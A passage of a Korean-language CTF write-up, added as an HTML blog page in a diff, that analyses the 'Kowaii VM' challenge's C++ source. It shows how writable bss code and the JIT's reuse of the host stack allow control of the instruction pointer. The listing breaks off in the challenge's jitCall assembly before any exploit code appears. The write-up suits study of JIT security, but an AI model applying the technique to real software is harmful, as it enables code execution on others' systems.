+                    <a href="#vulnerability" aria-label="Vulnerability">Vulnerability</a></li></ul>
+                </li>
+                <li>
+                    <a href="#exploit" aria-label="Exploit">Exploit</a></li>
+                <li>
+                    <a href="#exploit-1" aria-label="Exploit">Exploit</a>
+                </li>
+            </ul>
+            </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h1 id="kowaii-vm">Kowaii VM<a hidden class="anchor" aria-hidden="true" href="#kowaii-vm">#</a></h1>
+<h2 id="analysis">Analysis<a hidden class="anchor" aria-hidden="true" href="#analysis">#</a></h2>
+<p>문제에서 소스코드를 제공해준다.</p>
+<pre tabindex="0"><code>---- 0x0000
+Header data
+---- 0x1000
+.CODE
+---- bss &gt;= 0xc000
+.BSS
+---- 0xffff
+</code></pre><p>위와 같은 바이너리 구조를 입력으로 받는다.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span>        <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">prepareCtx</span>()
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>prepareFuncTable();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>regs<span style="color:#f92672">-&gt;</span>bp <span style="color:#f92672">=</span> (u64 <span style="color:#f92672">*</span>)mmap(<span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>genAddr(), STACK_SIZE, PROT_READ <span style="color:#f92672">|</span> PROT_WRITE, MAP_PRIVATE <span style="color:#f92672">|</span> MAP_ANON, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span>(<span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>regs<span style="color:#f92672">-&gt;</span>bp <span style="color:#f92672">==</span> (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)) error(<span style="color:#e6db74">&#34;Unable to map stack!&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>regs<span style="color:#f92672">-&gt;</span>bp <span style="color:#f92672">+=</span> (STACK_SIZE)<span style="color:#f92672">/</span><span style="color:#66d9ef">sizeof</span>(u64);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>regs<span style="color:#f92672">-&gt;</span>sp <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>regs<span style="color:#f92672">-&gt;</span>bp;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>jitBase <span style="color:#f92672">=</span> (u8 <span style="color:#f92672">*</span>)mmap(<span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>genAddr(), JIT_SIZE, PROT_READ <span style="color:#f92672">|</span> PROT_EXEC, MAP_PRIVATE <span style="color:#f92672">|</span> MAP_ANON, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span>(<span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>jitBase <span style="color:#f92672">==</span> (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)) error(<span style="color:#e6db74">&#34;Unable to allocate executable memory!&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>jitEnd <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>jitBase <span style="color:#f92672">+</span> JIT_SIZE;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>callStackBase <span style="color:#f92672">=</span> (kowaiiFuncEntry <span style="color:#f92672">**</span>)mmap(<span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>genAddr(), STACK_SIZE, PROT_READ <span style="color:#f92672">|</span> PROT_WRITE, MAP_PRIVATE <span style="color:#f92672">|</span> MAP_ANON, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span>(<span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>callStackBase <span style="color:#f92672">==</span> (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)) error(<span style="color:#e6db74">&#34;Unable to map call stack!&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>callStack <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>callStackBase;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>regs<span style="color:#f92672">-&gt;</span>pc <span style="color:#f92672">=</span> (u8 <span style="color:#f92672">*</span>)(<span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>bin)<span style="color:#f92672">+</span><span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>bin<span style="color:#f92672">-&gt;</span>entry;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>bss <span style="color:#f92672">=</span> ((u8 <span style="color:#f92672">*</span>)(<span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>bin)<span style="color:#f92672">+</span><span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>bin<span style="color:#f92672">-&gt;</span>bss);
+</span></span><span style="display:flex;"><span>            mprotect((<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)((u64)<span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>bin<span style="color:#f92672">+</span>CODE_START_ADDR), <span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>bin<span style="color:#f92672">-&gt;</span>bss<span style="color:#f92672">-</span>CODE_START_ADDR, PROT_READ);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>};
+</span></span></code></pre></div><p>커스텀 바이너리를 입력으로 받는다.<br>
+text, bss 영역이 존재한다.<br>
+vm context를 세팅하는 함수가 있는데 stack, jit page, callStack 모두 주소가 랜덤화된다.<br>
+vm은 checkState에서 검증을 모두 수행하고 취약점이 발생하지 않는다.<br>
+그리고 JIT compile이 활성화되었는지 아닌지에 따라서 callFunc, retFunc가 오버라이딩된다.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span>        <span style="color:#66d9ef">void</span> <span style="color:#66d9ef">virtual</span> <span style="color:#a6e22e">callFunc</span>()
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            u16 hash <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(u16 <span style="color:#f92672">*</span>)(<span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>ctx.regs<span style="color:#f92672">-&gt;</span>pc<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>            kowaiiFuncEntry <span style="color:#f92672">*</span>fe <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>ctx.bin<span style="color:#f92672">-&gt;</span>no_funcs; i<span style="color:#f92672">++</span>)
+</span></span><span style="display:flex;"><span>            {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span>(hash <span style="color:#f92672">==</span> <span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>ctx.bin<span style="color:#f92672">-&gt;</span>funct[i].hash)
+</span></span><span style="display:flex;"><span>                {
+</span></span><span style="display:flex;"><span>                    fe <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span><span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>ctx.bin<span style="color:#f92672">-&gt;</span>funct[i];
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span>fe) error(<span style="color:#e6db74">&#34;Invalid function call!&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span>(fe<span style="color:#f92672">-&gt;</span>callCount <span style="color:#f92672">&gt;=</span> JIT_CC <span style="color:#f92672">&amp;&amp;</span> fe<span style="color:#f92672">-&gt;</span>size <span style="color:#f92672">&gt;=</span> JIT_MS)
+</span></span><span style="display:flex;"><span>            {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>jitCall(fe);
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>ctx.regs<span style="color:#f92672">-&gt;</span>pc <span style="color:#f92672">+=</span> <span style="color:#ae81ff">3</span>;
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">*</span>(<span style="color:#f92672">--</span><span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>ctx.regs<span style="color:#f92672">-&gt;</span>sp) <span style="color:#f92672">=</span> (u64)(<span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>ctx.regs<span style="color:#f92672">-&gt;</span>pc<span style="color:#f92672">+</span><span style="color:#ae81ff">3</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>ctx.regs<span style="color:#f92672">-&gt;</span>pc <span style="color:#f92672">=</span> (u8 <span style="color:#f92672">*</span>)fe<span style="color:#f92672">-&gt;</span>addr;
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">*</span>(<span style="color:#f92672">++</span><span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>ctx.callStack) <span style="color:#f92672">=</span> fe;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">void</span> <span style="color:#66d9ef">virtual</span> <span style="color:#a6e22e">retFunc</span>()
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>ctx.regs<span style="color:#f92672">-&gt;</span>pc <span style="color:#f92672">=</span> (u8 <span style="color:#f92672">*</span>)(<span style="color:#f92672">*</span><span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>ctx.regs<span style="color:#f92672">-&gt;</span>sp<span style="color:#f92672">++</span>);
+</span></span><span style="display:flex;"><span>            (<span style="color:#f92672">*</span><span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>ctx.callStack)<span style="color:#f92672">-&gt;</span>callCount<span style="color:#f92672">++</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span>((<span style="color:#f92672">*</span><span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>ctx.callStack)<span style="color:#f92672">-&gt;</span>callCount <span style="color:#f92672">&gt;=</span> JIT_CC <span style="color:#f92672">&amp;&amp;</span> (<span style="color:#f92672">*</span><span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>ctx.callStack)<span style="color:#f92672">-&gt;</span>size <span style="color:#f92672">&gt;=</span> JIT_MS ) <span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>jitGen(<span style="color:#f92672">*</span><span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>ctx.callStack);
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">*</span>(<span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>ctx.callStack<span style="color:#f92672">--</span>) <span style="color:#f92672">=</span> NULL; 
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span></code></pre></div><p>JIT이 활성화된 클래스를 확인해보면 retFunc에서 callStack을 빼면서 callCount를 수집한다.<br>
+또한 CallCount를 JIT_CC와 비교해서 네이티브로 컴파일해 최적화를 수행한다.<br>
+이미 앞서 vm에서 충분히 검증되었다고 믿고, JIT에선 검증없이 컴파일한다.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span>        <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">jitEmitIns</span>(u64 INS, u16 reg1, u16 reg2, u16 reg3)
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            u8 insSize <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span>(INS <span style="color:#f92672">&lt;</span> (<span style="color:#ae81ff">1</span><span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">8</span>)) insSize <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span>(INS <span style="color:#f92672">&lt;</span> (<span style="color:#ae81ff">1</span><span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">16</span>)) insSize <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x2</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span>(INS <span style="color:#f92672">&lt;</span> (<span style="color:#ae81ff">1</span><span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">24</span>)) insSize <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x3</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span> insSize <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">*</span>(u64 <span style="color:#f92672">*</span>)(<span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>ctx.jitBase) <span style="color:#f92672">=</span> INS;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span>(reg1 <span style="color:#f92672">!=</span> x64_NOREG)
+</span></span><span style="display:flex;"><span>            {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span>(reg1 <span style="color:#f92672">&lt;</span> MAX_REGS) reg1 <span style="color:#f92672">=</span> x64_REG<span style="color:#f92672">+</span>reg1;
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">else</span> reg1 <span style="color:#f92672">=</span> reg1 <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x3</span>;
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">*</span>(<span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>ctx.jitBase<span style="color:#f92672">+</span>insSize<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) <span style="color:#f92672">+=</span> reg1;
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span>(reg2 <span style="color:#f92672">!=</span> x64_NOREG)
+</span></span><span style="display:flex;"><span>            {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span>(reg2 <span style="color:#f92672">&lt;</span> MAX_REGS) reg2 <span style="color:#f92672">=</span> x64_REG<span style="color:#f92672">+</span>reg2;
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">else</span> reg2 <span style="color:#f92672">=</span> reg2 <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x3</span>;
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">*</span>(<span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>ctx.jitBase<span style="color:#f92672">+</span>insSize<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) <span style="color:#f92672">+=</span> reg2 <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">3</span>;
+</span></span><span style="display:flex;"><span>            } 
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span>(reg3 <span style="color:#f92672">!=</span> x64_NOREG)
+</span></span><span style="display:flex;"><span>            {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span>(reg3 <span style="color:#f92672">&lt;</span> MAX_REGS) reg3 <span style="color:#f92672">=</span> x64_REG<span style="color:#f92672">+</span>reg3;
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">else</span> reg3 <span style="color:#f92672">=</span> reg3 <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x3</span>;
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">*</span>(<span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>ctx.jitBase<span style="color:#f92672">+</span>insSize<span style="color:#f92672">-</span><span style="color:#ae81ff">2</span>) <span style="color:#f92672">+=</span> reg3 <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">3</span>;
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>ctx.jitBase <span style="color:#f92672">+=</span> insSize;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">jitGen</span>(kowaiiFuncEntry <span style="color:#f92672">*</span>fe)
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            ...
+</span></span><span style="display:flex;"><span>            mprotect(<span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>ctx.jitEnd<span style="color:#f92672">-</span>JIT_SIZE, JIT_SIZE, PROT_READ <span style="color:#f92672">|</span> PROT_WRITE);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            fe<span style="color:#f92672">-&gt;</span>addr <span style="color:#f92672">=</span> (u64)<span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>ctx.jitBase;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">while</span>(i <span style="color:#f92672">&lt;</span> fe<span style="color:#f92672">-&gt;</span>size)
+</span></span><span style="display:flex;"><span>            {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span>(<span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>ctx.jitBase <span style="color:#f92672">&gt;=</span> <span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>ctx.jitEnd) error(<span style="color:#e6db74">&#34;Out of executable memory!&#34;</span>);
+</span></span><span style="display:flex;"><span>                kfe <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>                reg1 <span style="color:#f92672">=</span> code[i<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>];
+</span></span><span style="display:flex;"><span>                reg2 <span style="color:#f92672">=</span> code[i<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>];
+</span></span><span style="display:flex;"><span>                reg3 <span style="color:#f92672">=</span> code[i<span style="color:#f92672">+</span><span style="color:#ae81ff">3</span>];
+</span></span><span style="display:flex;"><span>                imm <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(u64 <span style="color:#f92672">*</span>)(code<span style="color:#f92672">+</span>i<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>);
+</span></span><span style="display:flex;"><span>                hash <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(u16 <span style="color:#f92672">*</span>)(code<span style="color:#f92672">+</span>i<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">switch</span>(code[i])
+</span></span><span style="display:flex;"><span>                {
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">case</span> ADD:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">if</span>(reg1 <span style="color:#f92672">!=</span> reg2 <span style="color:#f92672">&amp;&amp;</span> reg1 <span style="color:#f92672">!=</span> reg3)
+</span></span><span style="display:flex;"><span>                        {
+</span></span><span style="display:flex;"><span>                            <span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>jitEmitIns(x64_MOVNN, reg1, reg2, x64_NOREG);
+</span></span><span style="display:flex;"><span>                            <span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>jitEmitIns(x64_ADD, reg1, reg3, x64_NOREG);
+</span></span><span style="display:flex;"><span>                        }
+</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>                        {
+</span></span><span style="display:flex;"><span>                            <span style="color:#66d9ef">if</span>(reg1 <span style="color:#f92672">==</span> reg2) <span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>jitEmitIns(x64_ADD, reg1, reg3, x64_NOREG);   
+</span></span><span style="display:flex;"><span>                            <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>jitEmitIns(x64_ADD, reg1, reg2, x64_NOREG);
+</span></span><span style="display:flex;"><span>                        }
+</span></span><span style="display:flex;"><span>                        i <span style="color:#f92672">+=</span> <span style="color:#ae81ff">4</span>;
+</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>        ...
+</span></span><span style="display:flex;"><span>cleanup:
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">*</span><span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>ctx.jitBase<span style="color:#f92672">++</span> <span style="color:#f92672">=</span> x64_RET;
+</span></span><span style="display:flex;"><span>            mprotect(<span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>ctx.jitEnd<span style="color:#f92672">-</span>JIT_SIZE, JIT_SIZE, PROT_READ <span style="color:#f92672">|</span> PROT_EXEC);
+</span></span><span style="display:flex;"><span>        }
+</span></span></code></pre></div><p>검증없이 set / get oob가 발생할 가능성이 있다.<br>
+근데 앞서 최적화되기 전에 검증이 있기 때문에 code가 런타임에 수정되지 않는한 취약하지 않다.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">prepareFuncTable</span>()
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>bin<span style="color:#f92672">-&gt;</span>no_funcs; i<span style="color:#f92672">++</span>)
+</span></span><span style="display:flex;"><span>            {
+</span></span><span style="display:flex;"><span>                u64 addr <span style="color:#f92672">=</span> (u64)(<span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>bin<span style="color:#f92672">-&gt;</span>funct[i].addr);
+</span></span><span style="display:flex;"><span>                
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span>(addr <span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>bin<span style="color:#f92672">-&gt;</span>bss <span style="color:#f92672">||</span> addr <span style="color:#f92672">&lt;</span> CODE_START_ADDR) error(<span style="color:#e6db74">&#34;Invalid function table!&#34;</span>);
+</span></span></code></pre></div><p>근데 앞서 검증할때 code address &lt; this-&gt;bin-&gt;bss 여야하고, 이에 부정은 code address &gt;= this-&gt;bin-&gt;bss 이기 때문에 bss 영역에 코드를 작성하고 call hash를 통해 런타임에 수정되는 코드를 만들 수 있다.</p>
+<h3 id="vulnerability">Vulnerability<a hidden class="anchor" aria-hidden="true" href="#vulnerability">#</a></h3>
+<p>사실 bss에 쓰기 가능한 코드를 이용해 JIT gen 함수의 취약점을 악용할 필요도 없이 설계상의 문제로도 그냥 익스플로잇이 가능했다.<br>
+한번 JIT 컴파일이 되면, push / pop 같은 스택 조작 명령을 통해 실제 레지스터 rip에 대한 컨트롤이 가능하다.<br>
+근본적으로 vm에서 host rsp를 그대로 이용하는거 자체가 문제이다.</p>
+<h2 id="exploit">Exploit<a hidden class="anchor" aria-hidden="true" href="#exploit">#</a></h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span>        __attribute__((noinline))
+</span></span><span style="display:flex;"><span>        __attribute__((<span style="color:#66d9ef">naked</span>))
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">void</span> jitCall(kowaiiFuncEntry <span style="color:#f92672">*</span>fe)
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            __asm__(
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;push rbp;&#34;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;push r8;&#34;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;push r9;&#34;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;push r10;&#34;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;push r11;&#34;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;push r12;&#34;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;push r13;&#34;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;push r14;&#34;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;push r15;&#34;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;push rdi;&#34;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;push rdx;&#34;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;push rcx;&#34;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;xor r8, r8;&#34;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;xor r9, r9;&#34;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;mov rbp, rsp;&#34;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;mov rdx, qword ptr [rdi+0x28];&#34;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;mov rdi, qword ptr [rdi+0x10];&#34;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;mov r10, qword ptr [rdi];&#34;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;mov r11, qword ptr [rdi+0x8];&#34;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;mov r12, qword ptr [rdi+0x10];&#34;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;mov r13, qword ptr [rdi+0x18];&#34;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;mov r14, qword ptr [rdi+0x20];&#34;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;mov r15, qword ptr [rdi+0x28];&#34;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;mov rsp, qword ptr [rdi+0x38];&#34;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;call qword ptr [rsi+0x2];&#34;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;mov qword ptr [rdi], r10;&#34;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;mov qword ptr [rdi+0x8], r11;&#34;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;mov qword ptr [rdi+0x10], r12;&#34;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;mov qword ptr [rdi+0x18], r13;&#34;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;mov qword ptr [rdi+0x20], r14;&#34;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;mov qword ptr [rdi+0x28], r15;&#34;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;mov rsp, rbp;&#34;</span>
